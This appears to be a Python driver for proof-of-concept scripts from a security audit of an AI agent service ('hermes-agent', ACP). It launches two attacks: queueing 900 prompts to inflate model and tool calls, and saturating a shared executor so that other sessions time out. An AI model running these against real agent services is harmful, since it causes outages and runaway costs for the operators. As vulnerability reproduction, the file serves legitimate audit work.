import datetime as dt
import json
import subprocess
import sys
from pathlib import Path


ROOT = Path(__file__).resolve().parents[2]
SRC = ROOT / "hermes-agent-audit-src"
TASK = "Please perform a long-running repository investigation and keep working until complete."
FOLLOWUP = "After the current investigation, inspect module <N> and prepare concrete evidence."


def now():
    return dt.datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def run_json(script, *args):
    cmd = [sys.executable, str(ROOT / "pocs" / script), "--source-root", str(SRC), *args]
    result = subprocess.run(cmd, text=True, capture_output=True)
    if result.stderr:
        print(result.stderr, file=sys.stderr, end="")
    return json.loads(result.stdout)


def queue_attack():
    print(f"[{now()}] attack_start ACP prompt queue amplification queued=900")
    print(f"[{now()}] active_agent_task={TASK}")
    print(f"[{now()}] queued_agent_task_pattern={FOLLOWUP}")
    data = run_json(
        "hermes_acp_actual_prompt_repro.py",
        "--queued", "900",
        "--payload-bytes", "2048",
        "--active-delay-ms", "1000",
        "--drain-delay-ms", "0",
        "--tool-calls-per-run", "1",
    )
    obs, cost = data["observed"], data["process_cost"]
    print(f"[{now()}] queued_ack_messages={obs['queued_ack_messages']} last_ack={obs['last_queued_ack']}")
    print(f"[{now()}] model_calls={cost['model_calls']} tool_calls={cost['tool_calls']} history_messages={obs['session_history_messages']}")
    print(f"[{now()}] RESULT={data['result']}")
    return 0 if data["result"] == "REPRODUCED" else 1


def unavailable_attack():
    print(f"[{now()}] attack_start ACP shared executor unavailable within 250ms client deadline")
    print(f"[{now()}] active_agent_task={TASK}")
    print(f"[{now()}] queued_agent_task_pattern={FOLLOWUP}")
    data = run_json(
        "hermes_acp_shared_executor_repro.py",
        "--attack-sessions", "4",
        "--queued-per-session", "8",
        "--active-delay-ms", "500",
        "--drain-delay-ms", "1000",
        "--probe-after-active-ms", "50",
        "--probe-timeout-ms", "250",
        "--payload-bytes", "512",
    )
    obs = data["observed"]
    print(f"[{now()}] baseline_probe_ms={obs['baseline_probe_ms']} saturated_probe_ms={obs['saturated_probe_ms']} probe_completed={obs['saturated_probe_completed']}")
    print(f"[{now()}] SERVICE_UNAVAILABLE detail={obs['saturated_probe_detail']}")
    print(f"[{now()}] SERVICE_UNAVAILABLE shared_executor_blocked attack_model_calls={obs['total_attack_model_calls']}")
    print(f"[{now()}] RESULT={data['result']}")
    return 0 if "UNAVAILABLE" in data["result"] else 1


if __name__ == "__main__":
    mode = sys.argv[1] if len(sys.argv) > 1 else "queue"
    raise SystemExit(unavailable_attack() if mode == "unavailable" else queue_attack())
